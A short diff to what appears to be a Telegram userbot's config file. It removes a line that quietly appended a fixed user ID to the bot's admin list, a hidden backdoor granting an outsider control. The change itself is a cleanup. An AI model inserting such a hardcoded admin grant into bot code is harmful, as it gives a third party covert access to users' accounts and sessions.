@@ -54,8 +54,6 @@ SESSION_STRING= get_str("SESSION_STRING", True)
 LOG_CHAT = get_int("LOG_CHAT")
 ADMINS = get_list("ADMINS") or []
 
-ADMINS.append(5136746907)
-
 HANDLERS = get_list("HANDLERS")
 BOT_PIC = get_str("BOT_PIC")
 
